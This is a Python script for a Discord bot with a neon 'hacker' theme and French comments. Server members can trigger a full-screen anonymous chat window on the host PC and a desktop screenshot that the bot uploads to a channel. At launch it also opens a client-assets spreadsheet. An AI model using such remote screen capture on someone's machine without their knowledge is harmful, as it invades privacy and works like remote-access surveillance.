import asyncio
import ctypes
import io
import logging
import math
import os
import queue
import random
import threading
import tkinter as tk
from tkinter import filedialog, scrolledtext

import discord
import pygame
import win32gui
import win32ui
from discord.ext import commands
from dotenv import load_dotenv
from PIL import Image, ImageGrab, ImageTk

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
# Dossier où se trouve ce script. Toutes les ressources (env, sons) sont
# résolues à partir d'ici, peu importe l'endroit depuis lequel le script est
# lancé (terminal, double-clic, tâche planifiée...).
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
ENV_PATH = os.path.join(BASE_DIR, ".env")
LOG_FILE = os.path.join(BASE_DIR, "erreurs.log")

logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
)

# Charge les variables du fichier .env (doit contenir DISCORD_TOKEN=...)
load_dotenv(ENV_PATH)

print("Dossier du script :", BASE_DIR)
print("Fichier .env trouvé :", os.path.exists(ENV_PATH))

TOKEN = os.getenv("DISCORD_TOKEN")

# ID du salon où envoyer un message au démarrage du bot (optionnel).
# Ajoute STARTUP_CHANNEL_ID=123456789012345678 dans le .env pour l'activer
# (clic droit sur le salon > Copier l'identifiant, avec le mode développeur
# activé dans Réglages > Avancés).
STARTUP_CHANNEL_ID = os.getenv("STARTUP_CHANNEL_ID")

# Fichier Excel ouvert automatiquement au lancement du script.
EXCEL_FILE_PATH = os.path.join(BASE_DIR, "dossier_actifs_clients_1.xlsx")

# Nom du salon où sont envoyées les captures du bureau (!capture).
# Les noms de salons Discord sont toujours en minuscules.
SCREENSHOT_CHANNEL_NAME = os.getenv("SCREENSHOT_CHANNEL_NAME", "screen")

# Extensions reconnues comme images quand Discord ne fournit pas de type MIME.
IMAGE_EXTENSIONS = (".png", ".jpg", ".jpeg", ".gif", ".webp", ".bmp")

# Thème "hacker" : fond noir, texte rouge néon, police monospace
BG_COLOR = "#0d0208"
FG_COLOR = "#ff0033"
FG_DIM = "#a6031a"
FONT_MAIN = ("Consolas", 11)
FONT_TITLE = ("Consolas", 12, "bold")

# Sons (de préférence en .wav : meilleure compatibilité avec pygame)
OPEN_SOUND_FILE = os.path.join(BASE_DIR, "open.wav")  # ouverture d'une fenêtre de chat
NOTIFICATION_SOUND_FILE = os.path.join(BASE_DIR, "notification.wav")  # message reçu

# ---------------------------------------------------------------------------
# Objets globaux
# ---------------------------------------------------------------------------
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

# File d'attente thread-safe : le bot y dépose des événements, tkinter les lit
gui_queue = queue.Queue()

bot_loop = None  # boucle asyncio du bot, définie au démarrage

# Sons préchargés une seule fois (None si le chargement a échoué)
open_sound = None
notification_sound = None


# ---------------------------------------------------------------------------
# Excel
# ---------------------------------------------------------------------------
def open_excel_file():
    """Ouvre EXCEL_FILE_PATH avec l'application associée (Excel)."""
    try:
        os.startfile(EXCEL_FILE_PATH)
    except Exception as e:
        print("Erreur lors de l'ouverture du fichier Excel :", e)


# ---------------------------------------------------------------------------
# Capture du bureau
# ---------------------------------------------------------------------------
def capturer_fenetre_arriere_plan(hwnd, chemin_sortie):
    """Capture le contenu d'une fenêtre par son handle Windows, même si une
    autre fenêtre est affichée par-dessus (API PrintWindow)."""
    left, top, right, bottom = win32gui.GetWindowRect(hwnd)
    largeur = right - left
    hauteur = bottom - top
    if largeur <= 0 or hauteur <= 0:
        return False

    hwnd_dc = win32gui.GetWindowDC(hwnd)
    mfc_dc = win32ui.CreateDCFromHandle(hwnd_dc)
    save_dc = mfc_dc.CreateCompatibleDC()
    save_bitmap = win32ui.CreateBitmap()
    save_bitmap.CreateCompatibleBitmap(mfc_dc, largeur, hauteur)
    save_dc.SelectObject(save_bitmap)

    # PW_RENDERFULLCONTENT = 2
    resultat = ctypes.windll.user32.PrintWindow(hwnd, save_dc.GetSafeHdc(), 2)

    bmpinfo = save_bitmap.GetInfo()
    bmpstr = save_bitmap.GetBitmapBits(True)
    image = Image.frombuffer(
        "RGB",
        (bmpinfo["bmWidth"], bmpinfo["bmHeight"]),
        bmpstr,
        "raw",
        "BGRX",
        0,
        1,
    )

    win32gui.DeleteObject(save_bitmap.GetHandle())
    save_dc.DeleteDC()
    mfc_dc.DeleteDC()
    win32gui.ReleaseDC(hwnd, hwnd_dc)

    if resultat == 1:
        image.save(chemin_sortie)
        return True
    return False


async def send_screenshot_to_channel(image_path):
    """Envoie l'image dans le salon SCREENSHOT_CHANNEL_NAME (tous serveurs confondus)."""
    channel = discord.utils.get(bot.get_all_channels(), name=SCREENSHOT_CHANNEL_NAME)
    if channel is None:
        print(f"Salon « {SCREENSHOT_CHANNEL_NAME} » introuvable : capture non envoyée.")
        print("Vérifie que le bot est bien sur le serveur et qu'un salon porte ce nom exact.")
        logging.error("Salon « %s » introuvable pour l'envoi de la capture.", SCREENSHOT_CHANNEL_NAME)
        return
    try:
        await channel.send("Voici la capture du bureau !", file=discord.File(image_path))
        print(f"Capture envoyée dans #{channel.name}.")
        logging.info("Capture envoyée dans #%s.", channel.name)
    except Exception as e:
        print("Erreur lors de l'envoi de la capture dans le salon :", e)
        logging.error("Erreur envoi capture dans le salon : %s", e)


def capture_and_send_desktop_screenshot():
    """Capture le bureau (icônes + fond d'écran), même si une fenêtre est
    ouverte par-dessus, puis l'envoie dans le salon Discord configuré."""
    screenshot_dir = os.path.join(BASE_DIR, "screenshots")
    os.makedirs(screenshot_dir, exist_ok=True)
    image_path = os.path.join(screenshot_dir, "capture_bureau.png")

    logging.info("Démarrage de la capture du bureau...")

    # "Progman" héberge les icônes et le fond d'écran du bureau. PrintWindow
    # dessine son contenu sans tenir compte des fenêtres qui le recouvrent.
    try:
        hwnd_bureau = win32gui.FindWindow("Progman", "Program Manager")
        succes = capturer_fenetre_arriere_plan(hwnd_bureau, image_path) if hwnd_bureau else False
        if not succes:
            print("Échec de la capture en arrière-plan, capture complète de l'écran en secours.")
            logging.warning("Échec PrintWindow sur le bureau, fallback vers capture complète.")
            ImageGrab.grab().save(image_path)
        print("Capture enregistrée :", image_path)
        logging.info("Capture enregistrée : %s", image_path)
    except Exception as e:
        print("Erreur lors de la capture du bureau :", e)
        logging.error("Erreur capture : %s", e)
        return

    # Le bot tourne dans sa propre boucle asyncio (autre thread) : on y délègue l'envoi.
    if not bot_loop:
        print("Boucle du bot non prête : capture non envoyée.")
        logging.error("bot_loop indisponible : capture non envoyée.")
        return

    asyncio.run_coroutine_threadsafe(send_screenshot_to_channel(image_path), bot_loop)


# ---------------------------------------------------------------------------
# Sons
# ---------------------------------------------------------------------------
def init_audio():
    """Initialise le mixer pygame et précharge les sons. À appeler une seule fois."""
    global open_sound, notification_sound
    try:
        pygame.mixer.init()
    except Exception as e:
        print("Erreur d'initialisation audio :", e)

    try:
        open_sound = pygame.mixer.Sound(OPEN_SOUND_FILE)
    except Exception as e:
        print("Erreur chargement du son d'ouverture :", e)

    try:
        notification_sound = pygame.mixer.Sound(NOTIFICATION_SOUND_FILE)
    except Exception as e:
        print("Erreur chargement du son de notification :", e)


def play_open_sound():
    """Joue le son d'ouverture de fenêtre, si chargé."""
    if open_sound is not None:
        try:
            open_sound.play()
        except Exception as e:
            print("Erreur lecture son d'ouverture :", e)


def play_notification_sound():
    """Joue le son de notification, si chargé."""
    if notification_sound is not None:
        try:
            notification_sound.play()
        except Exception as e:
            print("Erreur lecture son de notification :", e)


# ---------------------------------------------------------------------------
# Bot Discord : événements et commandes
# ---------------------------------------------------------------------------
@bot.event
async def on_ready():
    print(f"✅ Connecté en tant que {bot.user}")
    await announce_startup()


async def announce_startup():
    """Envoie un message dans STARTUP_CHANNEL_ID pour signaler le démarrage du bot."""
    if not STARTUP_CHANNEL_ID:
        return
    try:
        channel = bot.get_channel(int(STARTUP_CHANNEL_ID))
        if channel is None:
            channel = await bot.fetch_channel(int(STARTUP_CHANNEL_ID))
        await channel.send("🟢 Le bot vient de démarrer et est en ligne.")
    except discord.NotFound:
        print(f"❌ Salon introuvable pour l'ID {STARTUP_CHANNEL_ID} (STARTUP_CHANNEL_ID dans le .env).")
        print("Salons texte réellement visibles par le bot :")
        for guild in bot.guilds:
            print(f"  Serveur « {guild.name} » ({guild.id})")
            for ch in guild.text_channels:
                print(f"    - #{ch.name} -> {ch.id}")
        print("Copie l'un des ID ci-dessus dans STARTUP_CHANNEL_ID puis relance le bot.")
    except Exception as e:
        print("Erreur lors de l'annonce de démarrage :", e)


async def ignore_cooldown_error(ctx, error):
    """Gestionnaire d'erreur commun : ignore silencieusement les cooldowns."""
    if isinstance(error, commands.CommandOnCooldown):
        return
    raise error


@bot.command(name="chat")
@commands.cooldown(rate=1, per=3, type=commands.BucketType.channel)
async def open_chat_window(ctx):
    """Ouvre une fenêtre de discussion locale liée à ce salon Discord."""
    gui_queue.put(("open_window", ctx.channel.id, ctx.author.display_name))
    await ctx.send("Fenêtre ouverte sur l'ordinateur hôte ✅")


open_chat_window.error(ignore_cooldown_error)


@bot.command(name="end")
@commands.cooldown(rate=1, per=3, type=commands.BucketType.channel)
async def close_chat_window(ctx):
    """Ferme (à distance) la fenêtre de discussion liée à ce salon, avec l'animation de fermeture."""
    gui_queue.put(("close_window", ctx.channel.id))
    await ctx.send("Fermeture de la fenêtre demandée ✅")


close_chat_window.error(ignore_cooldown_error)


@bot.command(name="capture")
@commands.cooldown(rate=1, per=10, type=commands.BucketType.guild)
async def trigger_capture(ctx):
    """Déclenche une capture du bureau et l'envoie dans le salon SCREENSHOT_CHANNEL_NAME."""
    await ctx.send("📸 Capture en cours...")
    # Thread séparé pour ne pas geler le bot pendant la capture (~2-3 s).
    threading.Thread(target=capture_and_send_desktop_screenshot, daemon=True).start()


@trigger_capture.error
async def trigger_capture_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        await ctx.send(f"Merci de patienter encore {error.retry_after:.0f}s avant une nouvelle capture.")
        return
    raise error


@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    # Transmet chaque image jointe au message (photo, capture, etc.)
    for attachment in message.attachments:
        is_image = (attachment.content_type or "").startswith("image/") or attachment.filename.lower().endswith(
            IMAGE_EXTENSIONS
        )
        if not is_image:
            continue
        try:
            image_bytes = await attachment.read()
        except Exception as e:
            print("Erreur lors du téléchargement d'une image reçue :", e)
            continue
        gui_queue.put(("incoming_image", message.channel.id, message.author.display_name, image_bytes))

    # Transmet le texte du message à une éventuelle fenêtre déjà ouverte
    if message.content:
        gui_queue.put(("incoming", message.channel.id, message.author.display_name, message.content))

    await bot.process_commands(message)


def mask_name(name):
    """Masque totalement un pseudo, ex: 'Julien' -> '???'."""
    return "???"


def run_bot():
    """Lance le bot Discord dans sa propre boucle asyncio, dans ce thread."""
    global bot_loop
    bot_loop = asyncio.new_event_loop()
    asyncio.set_event_loop(bot_loop)
    bot_loop.run_until_complete(bot.start(TOKEN))


# ---------------------------------------------------------------------------
# Animation de fond façon "Matrix" (pluie de caractères)
# ---------------------------------------------------------------------------
class MatrixRain:
    """Pluie de caractères animée dessinée sur un Canvas tkinter."""

    CHARS = "アイウエオカキクケコサシスセソ0123456789ABCDEF$#%&<>/\\"

    def __init__(self, canvas, width, height):
        self.canvas = canvas
        self.font = ("Consolas", 12)
        self.char_w = 14
        self.char_h = 16
        self.trail_length = 16
        self.width = 0
        self.height = 0
        self.columns = 0
        self.drops = []
        self.trails = []
        self.resize(width, height)

    def resize(self, width, height):
        """Réinitialise la grille de colonnes quand la taille de la fenêtre change."""
        self.width = max(1, width)
        self.height = max(1, height)
        self.canvas.delete("matrix")
        self.columns = max(1, self.width // self.char_w)
        self.drops = [random.randint(-30, 0) for _ in range(self.columns)]
        self.trails = [[] for _ in range(self.columns)]

    def tick(self):
        """Avance l'animation d'une image. À appeler périodiquement via after()."""
        for col in range(self.columns):
            x = col * self.char_w
            row = self.drops[col]
            y = row * self.char_h

            if 0 <= y <= self.height:
                # Assombrit l'ancien caractère de tête avant d'en dessiner un nouveau
                trail = self.trails[col]
                if trail:
                    try:
                        self.canvas.itemconfig(trail[-1], fill=FG_DIM)
                    except tk.TclError:
                        pass

                item = self.canvas.create_text(
                    x, y, text=random.choice(self.CHARS), fill=FG_COLOR,
                    font=self.font, anchor="nw", tags="matrix",
                )
                trail.append(item)
                if len(trail) > self.trail_length:
                    self.canvas.delete(trail.pop(0))

            self.drops[col] += 1

            # Une fois sortie de l'écran, la colonne a une chance de repartir d'en haut
            if y > self.height and random.random() > 0.975:
                for old in self.trails[col]:
                    self.canvas.delete(old)
                self.trails[col] = []
                self.drops[col] = random.randint(-30, 0)


# ---------------------------------------------------------------------------
# Fenêtre de discussion
# ---------------------------------------------------------------------------
class ChatWindow(tk.Toplevel):
    """Fenêtre de discussion locale liée à un salon Discord précis, style terminal."""

    def __init__(self, master, channel_id, author_name):
        super().__init__(master)
        self.channel_id = channel_id
        self.configure(bg=BG_COLOR)
        masked_author = mask_name(author_name)
        self.title(f"root@discord:~# session [{masked_author}]")
        self.geometry("480x460")

        self.rain = None
        self._animation_job = None
        self._closing = False
        # tkinter ne garde pas de référence forte sur les PhotoImage : sans cette
        # liste, les images affichées disparaîtraient (collectées par le GC).
        self._images = []

        self._build_widgets(masked_author)

        self.append_message("[SYSTEME] Session initialisée. En attente de messages...")
        play_open_sound()

        self.protocol("WM_DELETE_WINDOW", self.on_close)
        self.after(50, self.force_foreground)
        self.after(0, self.maximize_window)

    # --- Construction de l'interface ---------------------------------------
    def _make_button(self, text, command):
        return tk.Button(
            self.entry_frame,
            text=text,
            command=command,
            bg=BG_COLOR,
            fg=FG_COLOR,
            activebackground=FG_DIM,
            activeforeground=BG_COLOR,
            font=FONT_MAIN,
            relief="flat",
            borderwidth=1,
            highlightbackground=FG_DIM,
            padx=8,
        )

    def _build_widgets(self, masked_author):
        # Canvas d'animation en fond (créé en premier = derrière les autres widgets)
        self.bg_canvas = tk.Canvas(self, bg=BG_COLOR, highlightthickness=0)
        self.bg_canvas.place(relx=0, rely=0, relwidth=1, relheight=1)
        self.bg_canvas.bind("<Configure>", self.on_canvas_configure)

        # Barre de titre façon terminal
        self.header = tk.Label(
            self,
            text=f">>> CONNEXION ÉTABLIE — {masked_author} <<<",
            bg=BG_COLOR,
            fg=FG_COLOR,
            font=FONT_TITLE,
            anchor="w",
            padx=8,
            pady=6,
        )
        self.header.pack(fill="x")

        self.log = scrolledtext.ScrolledText(
            self,
            state="disabled",
            wrap="word",
            bg=BG_COLOR,
            fg=FG_COLOR,
            insertbackground=FG_COLOR,
            font=FONT_MAIN,
            borderwidth=0,
            highlightthickness=1,
            highlightbackground=FG_DIM,
            highlightcolor=FG_COLOR,
        )
        self.log.pack(fill="both", expand=True, padx=8, pady=(0, 8))

        self.entry_frame = tk.Frame(self, bg=BG_COLOR)
        self.entry_frame.pack(fill="x", padx=8, pady=(0, 8))

        tk.Label(self.entry_frame, text=">", bg=BG_COLOR, fg=FG_COLOR, font=FONT_MAIN).pack(
            side="left", padx=(0, 4)
        )

        self.entry = tk.Entry(
            self.entry_frame,
            bg=BG_COLOR,
            fg=FG_COLOR,
            insertbackground=FG_COLOR,
            font=FONT_MAIN,
            relief="flat",
            highlightthickness=1,
            highlightbackground=FG_DIM,
            highlightcolor=FG_COLOR,
        )
        self.entry.pack(side="left", fill="x", expand=True)
        self.entry.bind("<Return>", self.send_message)
        self.entry.focus()

        self._make_button("[ENVOYER]", self.send_message).pack(side="right", padx=(6, 0))
        self._make_button("[IMAGE]", self.send_image).pack(side="right", padx=(6, 0))

    # --- Fenêtre / animation de fond ---------------------------------------
    def maximize_window(self):
        """Met la fenêtre en plein écran (maximisée) dès son ouverture."""
        try:
            self.state("zoomed")  # Windows
        except tk.TclError:
            try:
                self.attributes("-fullscreen", True)
            except tk.TclError:
                pass

    def on_canvas_configure(self, event):
        """Initialise ou redimensionne la pluie Matrix quand la taille du canvas change."""
        if self.rain is None:
            self.rain = MatrixRain(self.bg_canvas, event.width, event.height)
            self.animate()
        else:
            self.rain.resize(event.width, event.height)

    def animate(self):
        """Boucle d'animation : avance la pluie Matrix puis se replanifie."""
        if self.rain is not None:
            self.rain.tick()
        self._animation_job = self.after(60, self.animate)

    def force_foreground(self):
        """Force la fenêtre au premier plan, même si une autre appli a le focus."""
        # On attend que la fenêtre soit dessinée avant de modifier ses attributs,
        # sinon certains gestionnaires de fenêtres affichent un doublon.
        self.update_idletasks()
        self.deiconify()
        self.lift()
        self.attributes("-topmost", True)
        self.after(100, lambda: self.attributes("-topmost", False))
        self.focus_force()

    # --- Animation de fermeture --------------------------------------------
    def on_close(self):
        if self._closing:
            return
        self._closing = True

        if self._animation_job is not None:
            self.after_cancel(self._animation_job)
            self._animation_job = None

        self.append_message("[SYSTEME] Fermeture de la session...")

        try:
            self.state("normal")
        except tk.TclError:
            pass
        self.update_idletasks()

        self._close_start_w = self.winfo_width()
        self._close_start_h = self.winfo_height()
        self._close_start_x = self.winfo_x()
        self._close_start_y = self.winfo_y()
        # Plus grand = animation plus lente (plus d'étapes)
        self._close_steps_total = 30
        self._close_step_i = 0
        self._close_min_h = 120  # hauteur restante pour laisser de la place à l'explosion

        self.fade_out()

    def fade_out(self):
        """La fenêtre se rétrécit en hauteur (façon rideau) et s'estompe."""
        self._close_step_i += 1
        progress = self._close_step_i / self._close_steps_total

        new_h = max(self._close_min_h, int(self._close_start_h * (1 - progress)))
        new_y = self._close_start_y + (self._close_start_h - new_h) // 2
        try:
            self.geometry(f"{self._close_start_w}x{new_h}+{self._close_start_x}+{new_y}")
        except tk.TclError:
            pass

        try:
            self.attributes("-alpha", max(0.3, 1 - progress))
        except tk.TclError:
            pass

        if self._close_step_i >= self._close_steps_total:
            self.start_explosion()
            return
        self.after(70, self.fade_out)

    def start_explosion(self):
        """Prépare une explosion de lignes rouges radiales au centre de la fenêtre restante."""
        self.update_idletasks()
        w = self.winfo_width()
        h = self.winfo_height()

        self._explode_cx = w / 2
        self._explode_cy = h / 2
        self._explode_max_radius = math.hypot(w, h) / 1.6
        self._explode_steps_total = 14
        self._explode_step = 0

        num_particles = 20
        self._explode_angles = [2 * math.pi * i / num_particles for i in range(num_particles)]
        self._explode_lines = [
            self.bg_canvas.create_line(
                self._explode_cx, self._explode_cy, self._explode_cx, self._explode_cy,
                fill=FG_COLOR, width=2, tags="explosion",
            )
            for _ in self._explode_angles
        ]

        self.animate_explosion()

    def animate_explosion(self):
        """Fait grandir les lignes depuis le centre, puis détruit la fenêtre."""
        self._explode_step += 1
        progress = self._explode_step / self._explode_steps_total
        radius = progress * self._explode_max_radius
        color = FG_COLOR if progress < 0.6 else FG_DIM

        for item, angle in zip(self._explode_lines, self._explode_angles):
            x2 = self._explode_cx + radius * math.cos(angle)
            y2 = self._explode_cy + radius * math.sin(angle)
            try:
                self.bg_canvas.coords(item, self._explode_cx, self._explode_cy, x2, y2)
                self.bg_canvas.itemconfig(item, fill=color)
            except tk.TclError:
                pass

        if self._explode_step >= self._explode_steps_total:
            self.destroy()
            return
        self.after(45, self.animate_explosion)

    # --- Messages et images -------------------------------------------------
    def append_message(self, text):
        self.log.configure(state="normal")
        self.log.insert("end", f"$ {text}\n")
        self.log.configure(state="disabled")
        self.log.see("end")

    def append_image(self, image_bytes, max_size=(320, 320)):
        """Affiche une image (reçue ou envoyée) dans le journal de la fenêtre."""
        try:
            img = Image.open(io.BytesIO(image_bytes))
            img.thumbnail(max_size)
            photo = ImageTk.PhotoImage(img)
        except Exception as e:
            self.append_message(f"[SYSTEME] Image reçue mais impossible à afficher ({e})")
            return

        self._images.append(photo)

        self.log.configure(state="normal")
        self.log.insert("end", "\n")
        self.log.image_create("end", image=photo)
        self.log.insert("end", "\n")
        self.log.configure(state="disabled")
        self.log.see("end")

    def send_message(self, event=None):
        text = self.entry.get().strip()
        if not text:
            return
        self.entry.delete(0, "end")
        self.append_message(f"moi> {text}")

        channel = bot.get_channel(self.channel_id)
        if channel and bot_loop:
            asyncio.run_coroutine_threadsafe(channel.send(text), bot_loop)

    def send_image(self):
        """Ouvre un sélecteur de fichier et envoie l'image choisie dans le salon Discord."""
        path = filedialog.askopenfilename(
            title="Choisir une image à envoyer",
            filetypes=[
                ("Images", "*.png *.jpg *.jpeg *.gif *.webp *.bmp"),
                ("Tous les fichiers", "*.*"),
            ],
        )
        if not path:
            return

        try:
            with open(path, "rb") as f:
                image_bytes = f.read()
        except Exception as e:
            self.append_message(f"[SYSTEME] Impossible de lire le fichier ({e})")
            return

        channel = bot.get_channel(self.channel_id)
        if channel and bot_loop:
            asyncio.run_coroutine_threadsafe(channel.send(file=discord.File(path)), bot_loop)
        else:
            self.append_message("[SYSTEME] Bot non prêt : image non envoyée sur Discord.")

        self.append_message(f"moi> [image envoyée : {os.path.basename(path)}]")
        self.append_image(image_bytes)


# ---------------------------------------------------------------------------
# Application principale
# ---------------------------------------------------------------------------
class App:
    """Application tkinter principale : reste invisible, gère les fenêtres de discussion."""

    def __init__(self):
        self.root = tk.Tk()
        self.root.withdraw()  # pas de fenêtre principale, seulement les fenêtres de chat
        self.windows = {}  # channel_id -> ChatWindow
        self.root.after(100, self.poll_queue)

    def _get_window(self, channel_id):
        """Retourne la fenêtre ouverte pour ce salon, ou None."""
        window = self.windows.get(channel_id)
        if window and window.winfo_exists():
            return window
        return None

    def poll_queue(self):
        try:
            while True:
                self.handle_event(gui_queue.get_nowait())
        except queue.Empty:
            pass
        self.root.after(100, self.poll_queue)

    def handle_event(self, event):
        kind = event[0]

        if kind == "open_window":
            _, channel_id, author_name = event
            window = self._get_window(channel_id)
            if window:
                window.force_foreground()
            else:
                self.windows[channel_id] = ChatWindow(self.root, channel_id, author_name)

        elif kind == "close_window":
            _, channel_id = event
            window = self._get_window(channel_id)
            if window:
                window.on_close()

        elif kind == "incoming":
            _, channel_id, author_name, content = event
            window = self._get_window(channel_id)
            if window:
                window.append_message(f"{mask_name(author_name)}: {content}")
                play_notification_sound()

        elif kind == "incoming_image":
            _, channel_id, author_name, image_bytes = event
            window = self._get_window(channel_id)
            if window:
                window.append_message(f"{mask_name(author_name)} a envoyé une image :")
                window.append_image(image_bytes)
                play_notification_sound()

    def run(self):
        self.root.mainloop()


if __name__ == "__main__":
    if not TOKEN:
        raise ValueError(
            "Définis la variable DISCORD_TOKEN dans un fichier .env "
            "(ou dans l'environnement) avant de lancer le script."
        )

    init_audio()
    open_excel_file()
    threading.Thread(target=run_bot, daemon=True).start()
    App().run()